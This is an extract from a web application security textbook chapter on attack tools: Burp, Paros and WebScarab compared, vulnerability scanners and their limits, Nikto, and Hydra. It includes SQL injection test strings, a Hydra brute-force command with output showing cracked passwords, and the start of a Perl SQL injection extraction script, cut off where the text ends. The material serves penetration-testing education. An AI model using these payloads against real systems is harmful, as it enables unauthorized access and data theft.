saved\nsessions.\n■■ Integration with the host computer clipboard, enabling fast transfer of\ndata to and from other programs.\n■■ Support for downstream proxies, enabling you to chain different tools\ntogether or access an application via the proxy used by your organiza-\ntion or ISP.\n■■ In-tool support for HTTP authentication methods, enabling you to use\nall of the suite’s features in environments where these are used, such as\ncorporate LANs.\n■■ Support for client SSL certificates, enabling you to attack applications\nwhich employ these.\n■■ Handling of the more obscure features of HTTP, such as gzipcontent\nencoding, chunked transfer encoding, and status 100 interim responses.\n■■ Extensibility, enabling the built-in functionality to be modified and\nextended in arbitrary ways by third-party code.\n■■ Persistent configuration of tool options, enabling a particular setup to\nbe resumed on the next execution of the suite.\n■■ Platform-independence, enabling the tools to run on all popular operat-\ning systems.\n70779c19.qxd:WileyRed 9/14/07 3:15 PM Page 640\n640 Chapter 19 ■ A Web Application Hacker’s Toolkit\nFigure19-11: Requests and responses can be analyzed into their HTTP structure and\nparameters.\nFeature Comparison\nEach of the three main integrated testing suites implements the same core of\nfunctionality. All work effectively and are popular in the web application secu-\nrity community. To a great extent, which of the suites you use is a matter of\npersonal preference. If you do not already have a preference, we recommend\nthat you download and use each of the suites in a real-world situation, and\nestablish which best meets your needs.\nTable 19-1 shows the different features implemented by each of the tool\nsuites. For further details of the meaning of any specific feature, refer to the\npreceding discussion. It should be noted that each of the suites is still being\nactively developed, and functionality is constantly being enhanced. This\nanalysis is accurate as of September 2007.\nTable19-1: Comparison of Features Implemented by Each Tool Suite\nBURP PAROS WEBSCARAB\nPROXY\nInterception rules * * *\nHistory * * *\nCache * * *\n70779c19.qxd:WileyRed 9/14/07 3:15 PM Page 641\nChapter 19 ■ A Web Application Hacker’s Toolkit 641\nTable19-1 (continued)\nBURP PAROS WEBSCARAB\nMatch and replace * *\nIn-browser controls *\nMessage manipulation tools *\nHidden field revealer *\nSPIDER\nUpdate of results from proxy * * *\nPassive spidering * *\nTree view of results * * *\nTable view of results * *\nSearchable results *\nFine-grained scope control * * *\nParsing of HTML forms etc *\nParsing of JavaScript *\nAutomatic form parameter submission *\nUser-guided form parameter submission *\nCustom “not found” detection * *\nChecking for robots.txt *\nRetrieval of directory roots * * *\nAutomatic processing of cookies * * *\nSession-dependence testing *\nReferer header support * * *\nConfigurable HTTP headers * *\nControl of speed and order of requests *\nFUZZER/SCANNER\nAutomated vulnerability scan *\nManual vulnerability scan * *\nBuilt-in attack payloads * *\n(Continued)\n70779c19.qxd:WileyRed 9/14/07 3:15 PM Page 642\n642 Chapter 19 ■ A Web Application Hacker’s Toolkit\nTable19-1 (continued)\nBURP PAROS WEBSCARAB\nConfigurable payload generators * *\nAbility to save response data *\nCustomizable results analysis *\nData extraction functions *\nCookie analyzer *\nMANUAL REQUESTS\nIntegration with proxy * * *\nIntegration with spider * *\nIntegration with fuzzer * * *\nHistory * *\nSHARED FUNCTIONS\nAnalysis of HTTP message structure * *\nHTML rendering * *\nHex editing * *\nSearch facility * * *\nAutomatic Content-Lengthupdating * * *\nEncoders/decoders * *\nResponse compare functions *\nSave/load test session * *\nLogging * * *\nClipboard integration *\nDownstream proxy support * * *\nBasic authentication * * *\nNTLM authentication * * *\nDigest authentication *\nSupport for client SSL certificates * *\nGZIP handling * *\n70779c19.qxd:WileyRed 9/14/07 3:15 PM Page 643\nChapter 19 ■ A Web Application Hacker’s Toolkit 643\nTable19-1 (continued)\nBURP PAROS WEBSCARAB\nChunked encoding handling * * *\nHTTP 100 response handling * * *\nExtensibility * *\nPersistent configuration * * *\nPlatform independence * * *\nBurp Suite\nBurp is highly functional and provides an intuitive and user-friendly interface.\nIts proxy function allows configuration of very fine-grained interception rules,\nand clear analysis of HTTP messages’ structure and contents. The proxy can\nalso be configured to perform automated matching and replacement of mes-\nsage headers, and provides an in-browser interface for viewing the proxy\ncache and reissuing individual requests.\nOf all the integrated tool suites, Burp is the only one that implements a fully\nfunctional web application spider, which parses forms and JavaScript, and\nallows automated and user-guided submission of form parameters. This facil-\nity is still more basic than the full application scanners described later in this\nchapter; however, it is sufficient for most common application spidering\nneeds. The site map generated by passive and active spidering contains a rich\namount of detail in both tree and table form, showing the web of links between\ndifferent pages, analysis of forms, and the full request and response used to\nretrieve each item (see Figure 19-12). A further handy feature of the spider is\nthe facility to control the scope by IP range, which is useful when you are\nattacking a range of web sites belonging to a single organization—you can\nconfigure the spider to follow off-site links to any domain name provided that\nthis resolves to the organization’s IP range.\nThe primary discriminator of Burp Suite is the Intruder tool, which provides\na unique set of useful functionality. This is not a point-and-click scanner, but\nrather a very versatile tool for automating all kinds of custom attacks, includ-\ning resource enumeration, data extraction, and fuzzing for common vulnera-\nbilities. Of all the available scanning tools, it provides the most fine-grained\nand low-level access to the requests and responses that it generates, allowing\nyou to combine the virtues of human intelligence with computerized automa-\ntion. See Chapter 13 for examples of using Burp Intruder.\nBurp Suite is extensible via the Burp Extender interface, which enables any-\none with basic Java skills to extend and customize its functionality.\n70779c19.qxd:WileyRed 9/14/07 3:15 PM Page 644\n644 Chapter 19 ■ A Web Application Hacker’s Toolkit\nFigure19-12: The spider results generated by Burp Suite\nParos\nParos provides a functional intercepting proxy, although its built-in analysis of\nmessage structure and content is more limited than the other tools.\nThe spider tool is essentially a basic web site spider with no awareness of\nweb application issues such as JavaScript and form parameters. It performs\nthe basic key function of updating its results with URLs requested via the\nproxy, but does not do passive spidering in the way the other tools do. It can\nalso identify customized “not found” responses, reducing the amount of false\npositives generated.\nThe primary discriminator of Paros is its built-in vulnerability scanner, as\nshown in Figure 19-13. This is very basic compared with the full scanners\ndescribed later in this chapter; however, it can be useful for identifying some\ncommon vulnerabilities that have an obvious signature. For example:\n■■ Basic reflected cross-site scripting vulnerabilities.\n■■ Some SQL injection flaws.\n■■ Forms with autocomplete enabled.\n■■ Old versions of files (through checks for .bakand other extensions).\n70779c19.qxd:WileyRed 9/14/07 3:15 PM Page 645\nChapter 19 ■ A Web Application Hacker’s Toolkit 645\nAlthough the Paros scanner is by no means sufficient to discover the major-\nity of vulnerabilities in a typical application, nevertheless it can enable you to\nquickly locate any low-hanging fruit that exists. When you are dealing with a\nparticularly large application, running a Paros scan will give you plenty of\nleads to investigate that may enable you to escalate privileges or compromise\nthe entire application.\nOne benefit of using Paros for vulnerability scanning is that it uses the same\nrequests that have passed through the proxy as the basis for its attacks. Pro-\nvided that you have performed a comprehensive application-mapping exer-\ncise prior to executing a scan, this set of requests will contain everything\nnecessary to access all of the application’s functionality, with valid base values\nsubmitted within the request parameters. In contrast, a standalone vulnerabil-\nity scanner will be restricted to the requests it discovers through its own appli-\ncation spidering.\nOther useful features of Paros include the ability to save and load test ses-\nsions, and to import client SSL certificates for accessing web applications that\nuse these.\nFigure19-13: Some of the checks performed by the Paros scanner\nWebScarab\nWebScarab implements a basic intercepting proxy, although the authors find\nthe user interface less satisfying than those of the other tools.\nAs with Paros, the spider tool is a basic web site spider with no specific add-\nons to handle web applications. However, like Burp, it can do passive site\n70779c19.qxd:WileyRed 9/14/07 3:15 PM Page 646\n646 Chapter 19 ■ A Web Application Hacker’s Toolkit\nspidering effectively by parsing URLs from all of the responses processed via\nthe proxy.\nWebScarab contains a rudimentary fuzzer that can do some parameter\nmanipulation based on user-provided fuzz strings, and provide some basic\ndetails of the results.\nWebScarab provides the ability to save and load test sessions, and to import\nclient SSL certificates for accessing web applications that use these. It also\nimplements a useful function for comparing application responses to identify\nthe extent of differences between pairs of responses and highlighting these dif-\nferences in a colorized preview pane (see Figure 19-14). This function can be\nhandy when you are making minor adjustments to a request and need to\nquickly identify the effects on the application’s responses.\nWebScarab is extensible via the Bean Shell interface, which enables anyone\nwith basic Java skills to extend and customize its functionality.\nFigure19-14: WebScarab’s response compare function\nAlternatives to the Intercepting Proxy\nOne item that you should always have available in your toolkit is an alterna-\ntive to the usual proxy-based tools for the rare situations in which they cannot\n70779c19.qxd:WileyRed 9/14/07 3:15 PM Page 647\nChapter 19 ■ A Web Application Hacker’s Toolkit 647\nbe used. Such situations typically arise when you need to use some non-\nstandard authentication method to access the application, either directly or via\na corporate proxy, or where the application uses an unusual client SSL certifi-\ncate or browser extension. In these cases, because an intercepting proxy inter-\nrupts the HTTP connection between client and server, you may find that the\ntool prevents you from using some or all of the application’s functionality.\nThe standard alternative approach in these situations is to use an in-browser\ntool for monitoring and manipulating the HTTP requests generated by your\nbrowser. It remains the case that everything that occurs on the client, and all\ndata submitted to the server, is in principle under your full control. If you so\ndesired, you could write your own fully customized browser to perform any\ntask you required. What these browser extensions do is provide a quick and\neasy means to instrument the functionality of a standard browser without\ninterfering with the network-layer communications between the browser and\nserver. The approach therefore enables you to submit arbitrary requests to the\napplication while allowing the browser to use its normal means of communi-\ncating with the problematic application.\nThere are numerous extensions available for both Internet Explorer and\nFirefox, which implement broadly similar functionality. We will illustrate one\nexample of each, and we recommend that you experiment with various\noptions to find the one that best suits you.\nYou should note that the functionality of the browser extensions that cur-\nrently exist is very limited in comparison to the main tool suites. They do not\nperform any spidering or fuzzing, and you are restricted to working com-\npletely manually. Nevertheless, in situations where you are forced to use them,\nthey will enable you to perform a comprehensive attack on your target that\nwould not be possible using only a standard browser.\nTamper Data\nTamper Data is an extension to the Firefox browser. Any time you submit a\nform, Tamper Data will present a pop-up showing all of the request details,\nincluding HTTP headers and parameters, enabling you to view and modify\nthese, as illustrated in Figure19-15.\nTamperIE\nTamperIE implements essentially the same functionality within the\nInternet Explorer browser as Tamper Data does on Firefox, as illustrated in\nFigure19-16.\n70779c19.qxd:WileyRed 9/14/07 3:15 PM Page 648\n648 Chapter 19 ■ A Web Application Hacker’s Toolkit\nFigure19-15: Tamper Data enables modification of HTTP request details within Firefox.\nFigure19-16: TamperIE enables modification of HTTP request details\nwithin Internet Explorer."
  },
  {
    "input": "Vulnerability Scanners",
    "output": "70779c19.qxd:WileyRed 9/14/07 3:15 PM Page 649\nChapter 19 ■ A Web Application Hacker’s Toolkit 649\nVulnerability Scanners\nA number of different tools exist for performing automated vulnerability scans\nof web applications. These scanners have the benefit of being able to test a\nlarge amount of functionality in a relatively short time, and in a typical appli-\ncation are often able to identify a variety of important vulnerabilities.\nWeb application vulnerability scanners automate several of the techniques\nwe have described in this book, including application spidering, discovery of\ndefault and common content, and probing for common vulnerabilities. Having\nmapped the application’s content, the scanner works through its functionality,\nsubmitting a range of test strings within each parameter of each request, and\nanalyzes the application’s responses for signatures of common vulnerabilities.\nThe scanner produces a report describing each of the vulnerabilities it has dis-\ncovered. This report usually includes the specific request and response that the\napplication used to diagnose each reported vulnerability, enabling a knowl-\nedgeable user to manually investigate and confirm the existence of the bug.\nA key requirement when you are deciding whether and when to use a vul-\nnerability scanner is to understand the inherent strengths and weaknesses of\nthese type of tools, and the challenges that need to be addressed in the course\nof developing them. These considerations also affect how you can effectively\nmake use of an automated scanner, and how to interpret and rely upon its\nresults.\nVulnerabilities Detected by Scanners\nSeveral categories of common vulnerability can be detected by scanners with a\ndegree of reliability. These are vulnerabilities with a fairly standard signa-\nture—the scanner sends a crafted request designed to trigger this signature if\nthe vulnerability is present; if the signature appears in the application’s\nresponse to the request, then the scanner infers that the vulnerability is present.\nHere are some examples of vulnerabilities that can be detected in this way:\n■■ Reflected cross-site scripting vulnerabilities arise when user-supplied\ninput is echoed back in the application’s responses without appropriate\nsanitization. Automated scanners typically send test strings containing\nHTML markup, and search the responses for these strings, enabling\nthem to detect many of these flaws.\n■■ Some SQL injection vulnerabilities can be detected via a signature. For\nexample, submitting a single quotation mark may result in an ODBC\nerror message, or submitting the string ‘; waitfor delay ‘0:0:30’--\nmay result in a time delay.\n70779c19.qxd:WileyRed 9/14/07 3:15 PM Page 650\n650 Chapter 19 ■ A Web Application Hacker’s Toolkit\n■■ Some path traversal vulnerabilities can be detected by submitting a tra-\nversal sequence targeting a known file such as boot.inior /etc/passwd\nand searching the response for the appearance of this file.\n■■ Some command injection vulnerabilities can be detected by injecting a\ncommand that will cause a time delay, or will echo a specific string into\nthe application’s response.\n■■ Straightforward directory listings can be identified by requesting the\ndirectory path and looking for a response containing text that looks like\na directory listing.\n■■ Vulnerabilities like frame injection, liberally scoped cookies, and forms\nwith autocomplete enabled can be reliably detected by reviewing the\ncontents of client-side code.\n■■ Items not linked from the main published content, such as backup files\nand source files, can often be discovered by requesting each enumer-\nated resource with a different file extension.\nIn many of the preceding cases, there are instances of the same category of\nvulnerability that cannot be reliably detected using a standard attack string\nand signature. For example, with many input-based vulnerabilities, the appli-\ncation implements some rudimentary input validation that can be circum-\nvented using crafted input. The usual attack strings may be blocked or\nsanitized; however, a skilled attacker will be able to probe the input validation\nin place and discover a bypass to it. In other cases, a vulnerability may be trig-\ngered by standard strings but may not result in the expected signature. For\nexample, many SQL injection attacks do not result in any data or error mes-\nsages being returned to the user, and a path traversal vulnerability may not\nresult in the contents of the targeted file being directly returned in the applica-\ntion’s response.\nFurther, there are several important categories of vulnerability that do not\nhave a standard signature and that cannot be probed for using a standard set\nof attack strings. In general, automated scanners are not effective at discover-\ning defects of this kind. Here are someexamples of vulnerabilities that are not\nreliably detected by scanners:\n■■ Broken access controls, which enable a user to access other users’ data,\nor a low-privileged user to access administrative functionality. A scan-\nner does not understand the access control requirements relevant to the\napplication, nor is it able to assess the significance of the different func-\ntions and data that it discovers using any particular user account.\n70779c19.qxd:WileyRed 9/14/07 3:15 PM Page 651\nChapter 19 ■ A Web Application Hacker’s Toolkit 651\n■■ Attacks involving the modification of a parameter’s value in a way\nthat has meaning within the application—for example, a hidden field\nrepresenting the price of a purchased item, or the status of an order.\nA scanner does not understand the meaning that any parameter has\nwithin the application’s functionality.\n■■ Other logic flaws, such as beating a transaction limit using a negative\nvalue, or bypassing a stage of an account recovery process by omitting\na key request parameter.\n■■ Vulnerabilities in the design of application functionality, such as weak\npassword quality rules, the ability to enumerate usernames from login\nfailure messages, and easily guessable forgotten password hints.\n■■ Session hijacking attacks in which a sequence can be detected in the\napplication’s session tokens, enabling an attacker to masquerade as\nother users. Even if a scanner can recognize that a particular parameter\nhas a predictable value across successive logins, it will not understand\nthe significance of the different content that results from modifying that\nparameter.\n■■ Leakage of sensitive information such as listings of usernames, and logs\ncontaining session tokens.\nWithin the previous two listings of vulnerabilities, each one contains defects\nthat may be classified as low-hanging fruit—that is, capable of easy detection\nand exploitation by an attacker with modest skills. Hence, while an automated\nscanner will often detect a decent proportion of the low-hanging fruit within\nan application, it will also typically miss a significant number of these prob-\nlems. Getting a clean bill of health from an automated scanner never provides\nany solid assurance that the application does not contain some serious vulner-\nabilities that can be easily found and exploited.\nIt is also fair to say that in the more security-critical applications that cur-\nrently exist, which have been subjected to more stringent security require-\nments and testing, the vulnerabilities that remain tend to be those appearing\non the second list, rather than the first.\nInherent Limitations of Scanners\nThe best vulnerability scanners on the market have been designed and imple-\nmented by experts who have given serious thought to the possible ways in\nwhich all kinds of web application vulnerabilities can be detected. It is no acci-\ndent that the resulting scanners remain unable to reliably detect many cate-\ngories of vulnerability. There are various inherent barriers to a fully automated\napproach to web application testing. These barriers will only be effectively\n70779c19.qxd:WileyRed 9/14/07 3:15 PM Page 652\n652 Chapter 19 ■ A Web Application Hacker’s Toolkit\naddressed by systems with full-blown artificial intelligence engines, going far\nbeyond the capabilities of today’s scanners.\nEvery Web Application Is Different\nWeb applications differ starkly from the domain of IT networks and infra-\nstructures, in which a typical installation employs off-the-shelf products in\nmore-or-less standard configurations. In the latter case, it is possible in princi-\nple to construct in advance a database of all possible targets, and create a tool\nto probe for every associated defect. This is not possible with bespoke web\napplications, and any effective scanner must expect the unexpected.\nScanners Operate on Syntax\nComputers can easily analyze the syntactic content of application responses\nand can recognize common error messages, HTTP status codes, and user-\nsupplied data being copied into web pages. However, today’s scanners cannot\nunderstand the semantic meaning of this content, nor can they make norma-\ntive judgments on the basis of this meaning. For example, in a function which\nupdates a shopping cart, a scanner will simply see numerous parameters\nbeing submitted. The scanner is not able to interpret that one of these parame-\nters signifies a quantity, and another signifies a price. Further, it is not able to\ndetermine that being able to modify an order’s quantity is inconsequential,\nwhile being able to modify its price represents a security flaw.\nScanners Do Not Improvise\nMany web applications use nonstandard mechanisms for handling sessions\nand navigation, and for transmitting and handling data—for example, in the\nstructure of the query string, cookies, or other parameters. A human being\nmay quickly notice and deconstruct the unusual mechanism, while a com-\nputer will continue following the standard rules it has been given. Further,\nmany attacks against web applications require some improvisation—for\nexample to circumvent partially effective input filters, or to exploit several dif-\nferent aspects of the application’s behavior that collectively leave it open to\nattack. Scanners typically miss these kinds of attacks.\n70779c19.qxd:WileyRed 9/14/07 3:15 PM Page 653\nChapter 19 ■ A Web Application Hacker’s Toolkit 653\nScanners Are Not Intuitive\nComputers do not have an intuition about how best to proceed. The approach\nof today’s scanners is to attempt every attack against every function. This\nimposes a practical limit on the variety of checks that can be performed and\nthe ways in which these can be combined. There are many cases where this\napproach overlooks vulnerabilities. For example:\n■■ Some attacks involve submitting crafted input at one or more steps of a\nmultistage process and walking through the rest of the process to\nobserve the results.\n■■ Some attacks involve changing the sequence of steps in which the\napplication expects a process to be performed.\n■■ Some attacks involve changing the value of multiple parameters in\ncrafted ways—for example, an XSS attack may require a specific value\nto be placed in one parameter, to cause an error message, and an XSS\npayload to be placed into another parameter, which is copied into the\nerror message.\nBecause of the practical constraints imposed on scanners’ brute-force\napproach to vulnerability detection, they are not able to work through every\npermutation of attack strings in different parameters, or every permutation of\nfunctional steps. Of course, no human being can practically do this either; how-\never, they will frequently have a feel for where the bugs are located, where the\ndeveloper will have made assumptions, and where something doesn’t “look\nright.” Hence, a human tester will select a tiny proportion of the total possible\nattacks for actual investigation, and thereby will often achieve success.\nTechnical Challenges Faced by Scanners\nThe barriers to automation described previously lead to a number of specific\ntechnical challenges that must be addressed in the creation of an effective vul-\nnerability scanner. These challenges impinge not only upon the scanner’s abil-\nity to detect specific types of vulnerability, as already described, but also upon\nits ability to perform the core tasks of mapping the application’s content and\nprobing for defects.\nAuthentication and Session Handling\nThe scanner must be able to work with the authentication and session-\nhandling mechanisms used by different applications. Frequently, the majority\n70779c19.qxd:WileyRed 9/14/07 3:15 PM Page 654\n654 Chapter 19 ■ A Web Application Hacker’s Toolkit\nof an application’s functionality can only be accessed using an authenticated\nsession, and a scanner that fails to operate using such a session will miss many\ndetectable flaws.\nIn current scanners, the authentication part of this problem is addressed by\nallowing the user of the scanner to provide a login script or to walk through\nthe authentication process using a built-in browser, enabling the scanner to\nobserve the specific steps involved in obtaining an authenticated session.\nThe session-handling part of the challenge is less straightforward to address\nand comprises the following two problems:\n■■ The scanner must be able to interact with whatever session-handling\nmechanism is used by the application. This may involve transmitting a\nsession token in a cookie, in a hidden form field, or within the URL\nquery string. Tokens may be static throughout the session or may\nchange on a per-request basis, or the application may employ a differ-\nent custom mechanism altogether.\n■■ The scanner must be able to detect when its session has ceased to be\nvalid, and so return to the authentication stage to acquire a new one.\nThis may occur for various reasons—for example, because the scanner\nhas requested the logout function, or because the application has termi-\nnated the session as a result of the scanner performingsome abnormal\nnavigation or submittingsome invalid input. The scanner must detect\nthis both during its initial mapping exercises and during its subsequent\nprobing for vulnerabilities. Different applications behave in very differ-\nent ways when a session becomes invalid, and for a scanner that only\nanalyzes the syntactic content of application responses, this may be a\ndifficult challenge to meet in general, particularly if a nonstandard ses-\nsion handling mechanism is used.\nDangerous Effects\nIn many applications, running an unrestricted automated scan without any\nuser guidance may be highly dangerous to the application and the data it con-\ntains. For example, a scanner may discover an administration page that con-\ntains functions to reset user passwords, delete accounts, and so on. If the\nscanner blindly requests every function, this may result in access being denied\nto all users of the application. Similarly, the scanner may discover a vulnera-\nbility that can be exploited to seriously corrupt the data held within the appli-\ncation. For example, in some SQL injection vulnerabilities, submitting\nstandard SQL attack strings such as or 1=1--causes unforeseen operations to\nbe performed on the application’s data. A human being who understands the\n70779c19.qxd:WileyRed 9/14/07 3:15 PM Page 655\nChapter 19 ■ A Web Application Hacker’s Toolkit 655\npurpose of a particular function may proceed with caution for this reason, but\nan automated scanner lacks this understanding.\nIndividuating Functionality\nThere are many situations in which a purely syntactic analysis of an applica-\ntion will fail to correctly identify its core set of individual functions:\n■■ Some applications contain a colossal quantity of content that embodies\nthe same core set of functionality. For example, applications like eBay,\nMySpace, and Amazon contain literally millions of different application\npages with different URLs and content, yet these correspond to a rela-\ntively small number of actual application functions.\n■■ Some applications may have no finite boundary when analyzed from a\npurely syntactic perspective. For example, a calendar application may\nallow users to navigate to any date. Similarly, some applications with a\nfinite amount of content employ volatile URLs or request parameters to\naccess the same content on different occasions, leading scanners to con-\ntinue mapping indefinitely.\n■■ The scanner’s own actions may result in the appearance of seemingly\nnew content. For example, submitting a form may cause a new link to\nappear in the application’s interface, and accessing the link may\nretrieve a further form that has the same behavior.\nIn any of these situations, a human attacker is able to quickly “see through”\nthe application’s syntactic content and identify the core set of actual functions\nthat need to be tested. For an automated scanner with no semantic under-\nstanding, this is considerably harder to do.\nAside from the obvious problems of mapping and probing the application\nin the situations described, a related problem arises in the reporting of discov-\nered vulnerabilities. A scanner based on purely syntactic analysis is prone to\ngenerating duplicate findings for each single vulnerability. For example, a scan\nreport might identify 200 XSS flaws, 195 of which arise in the same application\nfunction that the scanner probed multiple times because it appears in different\ncontexts with different syntactic content.\nOther Challenges to Automation\nSome applications implement defensive measures specifically designed to pre-\nvent them from being accessed by automated client programs. These measures\n70779c19.qxd:WileyRed 9/14/07 3:15 PM Page 656\n656 Chapter 19 ■ A Web Application Hacker’s Toolkit\ninclude reactive session termination in the event of anomalous activity, and the\nuse of CAPTCHAs and other controls designed to ensure that a human being\nis responsible for particular requests.\nIn general, the spidering function of the scanner faces the same challenges\nas web application spiders more generally, such as customized “not found”\nresponses and the ability to interpret client-side code. Many applications\nimplement fine-grained validation over particular items of input—for exam-\nple, the fields on a user registration form. If the spider populates the form with\ninvalid input, and is unable to understand the error messages generated by the\napplication, it may never proceed beyond this form to some important func-\ntions lying behind it.\nCurrent Products\nAt the time of this writing, the market leaders in web application vulnerability\nscanning tools are AppScan (produced by Watchfire) and WebInspect (pro-\nduced by SPI Dynamics). In this section, we present a brief analysis of these\ntwo tools.\nNOTE This is not a detailed or comprehensive product review. In the authors’\nexperience, each of these products performs effectively, and manifests the\ngeneric strengths and weaknesses of automated application scanners already\ndescribed. If you are interested in purchasing a scanner, we recommend that\nyou experiment with the free demo versions of these tools, and consult the\nspecifications for the latest releases.\nBoth products perform the key tasks of crawling the application’s function-\nality, performing Nikto-style checks for default and common content, and\nprobing each identified function for common vulnerabilities. They allow the\nuser to specify credentials to authenticate to the application, or perform a login\nusing the built-in browser so that the tool can understand the login process.\nBoth tools allow the scope of the test to be restricted to exclude the logout func-\ntion and any dangerous areas such as administrative functionality that may\nresult in damage to the application. The tools produce clear and detailed\nresults both within the user interface and in exported reports. Reported results\ninclude the specific request and response associated with each finding, and the\ntools allow direct manual verification of results using their built-in browser.\nBy way of direct comparison between the tools, it is fair to say that the sim-\nilarities between them outweigh their differences. WebInspect checks for a\n70779c19.qxd:WileyRed 9/14/07 3:15 PM Page 657\nChapter 19 ■ A Web Application Hacker’s Toolkit 657\nwider set of default and common content, and contains somewhat more\nadvanced SQL injection fingerprinting tests. The products check for broadly\nthe same set of common vulnerabilities that automated scanners are able to\ndetect, including SQL injection, cross-site scripting, HTTP header injection,\nand command injection. Within this set of flaws, the tools do a good job of\ndetecting vulnerabilities, although they miss more subtle and unusual\ninstances of these. Figures 19-17 and 19-18 show the results of scanning the\nsame application using each of the products. In the authors’ experience, each\nproduct has the edge over the other in various specific areas of vulnerability,\nand in a given test, the tools will typically identify a different subset of the total\nvulnerabilities present. Overall, the authors have found AppScan to perform\nbetter in the detection of more types of vulnerability.\nFigure19-17: The results reported by an AppScan test\n70779c19.qxd:WileyRed 9/14/07 3:15 PM Page 658\n658 Chapter 19 ■ A Web Application Hacker’s Toolkit\nFigure19-18: The results reported by an WebInspect test\nUsing a Vulnerability Scanner\nIn real-world situations, the effectiveness of using a vulnerability scanner\ndepends hugely upon the application you are targeting. The inherent\nstrengths and weaknesses that we have described impinge upon different\napplications in different ways, depending on the types of functionality and\nvulnerabilities which the applications contain.\nOf the various kinds of vulnerability commonly found within web applica-\ntions, automated scanners are inherently capable of discovering approxi-\nmately half of these, where a standard attack string and signature exist. Within\nthe subset of vulnerability types that scanners are able to detect, they do a\ngood job of identifying individual cases, although they miss the more subtle\nand unusual instances of these. Overall, you may expect that running an auto-\nmated scan will identify some but not all of the low-hanging fruit within a typ-\nical application."
  },
  {
    "input": "Other Tools",
    "output": "70779c19.qxd:WileyRed 9/14/07 3:15 PM Page 659\nChapter 19 ■ A Web Application Hacker’s Toolkit 659\nIf you are a novice, or you are attacking a large application with limited time\navailable, running an automated scan can bring clear benefits, because it will\nquickly identify several leads for further manual investigation, enabling you\nto get an initial handle on the security posture of the application and the types\nof flaws that exist. It will also provide you with a useful overview of the target\napplication and highlight any unusual areas that warrant further detailed\nattention.\nIf you are an expert at attacking web applications, and are serious about\nfinding as many vulnerabilities as possible within your target, you will be all\ntoo aware of the inherent limitations of vulnerability scanners, and will not\nfully trust them to completely cover any individual category of vulnerability.\nWhile the results of a scan will be interesting and prompt manual investigation\nof specific issues, you will typically want to perform a full manual test of every\narea of the application for every type of vulnerability, in order to satisfy your-\nself that the job has been done properly.\nIn any situation where you employ a vulnerability scanner, there are some\nkey points to keep in mind to ensure that you make the most effective use of it:\n■■ Be aware of the kinds of vulnerabilities that scanners can detect and\nthose that they cannot.\n■■ Be familiar with your scanner’s functionality, and know how to leverage\nits configuration to be the most effective against a given application.\n■■ Familiarize yourself with the target application before running your\nscanner, so that you can make the most effective use of it.\n■■ Be aware of the risks associated with spidering powerful functionality\nand automatically probing for dangerous bugs.\n■■ Always manually confirm any potential vulnerabilities reported by the\nscanner.\n■■ Be aware that scanners are extremely noisy and leave a significant foot-\nprint in the logs of the server and any IDS defenses. Do not use a scan-\nner if you are aiming to be stealthy.\nOther Tools\nIn addition to the tools already discussed, there are countless others that you\nmay find useful in a specific situation or to perform a particular task. In the\nremainder of this chapter, we describe a few of the other tools that you are\nlikely to encounter and make use of when attacking applications.\n70779c19.qxd:WileyRed 9/14/07 3:15 PM Page 660\n660 Chapter 19 ■ A Web Application Hacker’s Toolkit\nNikto\nNikto is useful for locating default or common third-party content that exists\non a web server. It contains a large database of files and directories, including\ndefault pages and scripts that ship with web servers, and third-party items\nsuch as shopping cart software. The tool essentially works by requesting each\nitem in turn and detecting whether it exists.\nThe database is updated frequently, meaning that Nikto is typically more\neffective than any other automated or manual technique for identifying this\ntype of content.\nNikto implements a wide range of configuration options, which can be spec-\nified on the command line or via a text-based configuration file. If the applica-\ntion uses a customized “not found” page, you can avoid false positives by\nusing the -404setting, which enables you to specify a string that appears in the\ncustom error page.\nAt the time of this writing, Nikto does not support HTTPS connections;\nhowever, you can overcome this restriction by using the stunnel tool described\nlater in this chapter.\nHydra\nHydra is a password-guessing tool that can be used in a wide range of situa-\ntions, including with the forms-based authentication commonly used in web\napplications. Of course, you can use a tool like Burp Intruder to execute any\nattack of this kind in a completely customized way; however, in many situa-\ntions Hydra can be just as useful.\nHydra enables you to specify the target URL, the relevant request parame-\nters, word lists for attacking the username and password fields, and details of\nthe error message that is returned following an unsuccessful login. The -tset-\nting can be used to specify the number of parallel threads to use in the attack.\nFor example:\nC:\\>hydra.exe –t 32 -L user.txt -P password.txt wahh-app.com http-post-\nform\n“/login.asp:login_name=^USER^&login_password=^PASS^&login=Login:Invalid”\nHydra v5.4 (c) 2006 by van Hauser / THC - use allowed only for legal\npurposes.\nHydra (http://www.thc.org) starting at 2007-05-22 16:32:48\n[DATA] 32 tasks, 1 servers, 21904 login tries (l:148/p:148), ~684 tries\nper task\n[DATA] attacking service http-post-form on port 80\n[STATUS] 397.00 tries/min, 397 tries in 00:01h, 21507 todo in 00:55h\n[80][www-form] host: 65.61.137.117 login: alice password: password\n[80][www-form] host: 65.61.137.117 login: liz password: password\n...\n70779c19.qxd:WileyRed 9/14/07 3:15 PM Page 661\nChapter 19 ■ A Web Application Hacker’s Toolkit 661\nCustom Scripts\nIn the authors’ experience, the various off-the-shelf tools that exist are suffi-\ncient to help you perform the vast majority of tasks that you need to carry out\nwhen attacking a web application. However, there are various unusual situa-\ntions in which you will need to create your own completely customized tools\nand scripts to address a particular problem. For example:\n■■ The application uses an unusual session-handling mechanism—for\nexample, involving per-page tokens that must be resubmitted in the\ncorrect sequence.\n■■ You wish to exploit a vulnerability that requires several specific steps to\nbe performed repeatedly, with data retrieved on one response incorpo-\nrated into subsequent requests.\n■■ The application aggressively terminates your session when it identifies\na potentially malicious request, and acquiring a fresh authenticated ses-\nsion requires several nonstandard steps.\nIf you have some programming experience, the easiest way to address prob-\nlems of this kind is to create a small, fully customized program to issue the rel-\nevant requests and process the application’s responses. You can produce this\neither as a standalone tool or as an extension to one of the integrated testing\nsuites described earlier—for example, by using the Burp Extender interface\nto extend Burp Suite or the Bean Shell interface to extend WebScarab.\nScripting languages like Perl contain libraries to help make HTTP commu-\nnication straightforward, and customized tasks can often be performed using\nonly a few lines of code. Even if you have limited programming experience,\nyou can often find a script on the Internet that can be tweaked to meet your\nrequirements. The following example shows a simple Perl script that exploits\na SQL injection vulnerability in a login form to make recursive queries and\nretrieve all of the values in a specified table column of a table, starting with the\nhighest value and iterating downwards (see Chapter 9 for more details of this\nkind of attack):\nuse HTTP::Request::Common;\nuse LWP::UserAgent;\n$ua = LWP::UserAgent->new();\nmy $col = @ARGV[0];\nmy $from_stmt = @ARGV[1];\nwhile(1)\n{\n# $payload is the exploit string to select the top value from the table.\n70779c19.qxd:WileyRed 9/14/07 3:15 PM Page 662\n662 Chapter 19 ■ A Web Application Hacker’s Toolkit\n$payload = “foo’ and (1 in (select max($col) from $from_stmt 